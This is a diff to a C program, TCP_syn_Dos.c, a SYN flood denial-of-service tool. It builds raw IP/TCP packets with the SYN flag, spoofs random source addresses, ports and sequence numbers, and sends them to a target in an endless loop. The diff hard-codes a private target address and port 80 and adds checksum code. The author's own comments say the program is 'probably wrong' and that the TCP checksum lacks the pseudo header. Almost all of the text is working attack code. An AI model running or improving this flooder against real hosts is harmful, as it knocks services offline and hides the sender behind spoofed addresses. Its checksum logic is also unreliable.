@@ -1,6 +1,8 @@
 /* TCP_syn_Dos.c
-Update: 2020-05-11T18:42+08@China-Guangdong-Zhanjiang
+Update: 2020-05-11T22:39+08@China-Guangdong-Zhanjiang
 */
+
+// notice: this program probably is wrong.
 
 #include <unistd.h>
 #include <netdb.h>
@@ -106,7 +108,7 @@ bool check(bool failed, const char *file, const int line, const char *function, 
 }
 
 
-Ret ip_port(char *address, char *IP, unsigned *port) {
+Ret ip_port(char *address, char *IP, unsigned short *port) {
 	char deli = ':';
 	Ret ret = 0;
 
@@ -134,7 +136,7 @@ Ret ip_port(char *address, char *IP, unsigned *port) {
 
 		if (address[ptr] == deli) {
 			ptr += 1;
-			*port = atoi(&address[ptr]);
+			*port = (unsigned short)atoi(&address[ptr]);
 			ret += 1;
 		}
 	}
@@ -162,7 +164,10 @@ unsigned short checksum(void *data, int length) {
 	return (unsigned short)(~sum);
 }
 
-Ret attack(char *IP, unsigned port) {
+Ret attack(char *IP, unsigned short port) {
+	IP = "192.168.12.160";
+	port = 80;
+
 	Ret ret = 0;
 
 	Socket target;
@@ -170,39 +175,44 @@ Ret attack(char *IP, unsigned port) {
 	target.sin_addr.s_addr = inet_addr(IP);
 	target.sin_port = htons(port);
 
-	setuid(getpid());
 	int client_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 	int on = 1;
 	setsockopt(client_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
 
 	char buffer[128];
-	int ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
-	struct ip *ip = (struct ip *)buffer;
+	memset(buffer, 0, sizeof(buffer));
 
-	ip->ip_v = IPVERSION;
-	ip->ip_hl = sizeof(struct ip) >> 2;
-	ip->ip_tos = 0;
-	ip->ip_len = htons(ip_len);
-	ip->ip_id = 0;
-	ip->ip_off = 0;
-	ip->ip_ttl = MAXTTL;
-	ip->ip_p = IPPROTO_TCP;
-	ip->ip_sum = 0;
-	ip->ip_dst.s_addr = inet_addr(IP);
+	struct ip *ip4 = (struct ip *)buffer;
+	ip4->ip_v = IPVERSION;
+	ip4->ip_hl = sizeof(struct ip) >> 2;
+	ip4->ip_tos = 0;
+	ip4->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr));
+	ip4->ip_id = 0;
+	ip4->ip_off = 0;
+	ip4->ip_ttl = MAXTTL;
+	ip4->ip_p = IPPROTO_TCP;
+	ip4->ip_sum = 0;
+	ip4->ip_dst.s_addr = inet_addr(IP);
 
 	struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ip));
 	tcp->dest = htons(port);
 	tcp->doff = 5;
 	tcp->syn = 1;
-	tcp->check = 0;
 
 	while (true) {
-		ip->ip_src.s_addr = (unsigned int)random();
+		tcp->check = 0;
+
+		ip4->ip_src.s_addr = (unsigned int)random();
+		ip4->ip_sum = checksum((void *)buffer, sizeof(struct ip));
+
+		//fprintf(stderr, "%s:%d ==> %s:%d \n", inet_ntoa(ip4->ip_src), tcp->source, inet_ntoa(ip4->ip_dst), tcp->dest);
+		//exit(0);
+
 		tcp->source = (unsigned short)random();
 		tcp->seq = (unsigned int)random();
-		tcp->check = checksum((void *)buffer, sizeof(struct tcphdr));
-		sendto(client_fd, buffer, ip_len, 0, (struct sockaddr *)&target, sizeof(target));
+		tcp->check = checksum((void *)buffer, sizeof(struct ip) + sizeof(struct tcphdr));  /* notice: lackof pseudo header */
 
+		sendto(client_fd, buffer, sizeof(struct ip) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target, sizeof(target));
 		ret += 1;
 	}
 
@@ -215,8 +225,8 @@ int main(int argc, char *argv[]) {
 		exit(0);
 	}
 
-	char IP[64] = { '\0' };
-	unsigned port = 0;
+	char IP[64];
+	unsigned short port = 0;
 	ip_port(argv[1], IP, &port);
 	// printf("%s:%d\n", IP, port);
 
